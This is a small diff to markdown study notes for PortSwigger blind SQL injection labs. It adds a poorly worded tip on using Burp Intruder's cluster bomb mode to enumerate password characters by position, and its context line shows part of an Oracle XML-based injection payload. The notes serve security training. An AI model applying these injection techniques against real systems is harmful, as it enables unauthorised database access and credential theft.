@@ -1122,6 +1122,10 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 
 ![sqli conditional response](images/sqli-conditional-response.png)  
 
+>Alterative use **cluster bomb** attack is setting to payload positions, on on the character position with payload of numbers ```1..20``` and second position the alpha and number characters, this will iterate through each permutation of payload combinations.  
+
+![cluster bomb](images/cluster-bomb.png)  
+
 [PortSwigger Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)  
   
 ### Oracle  
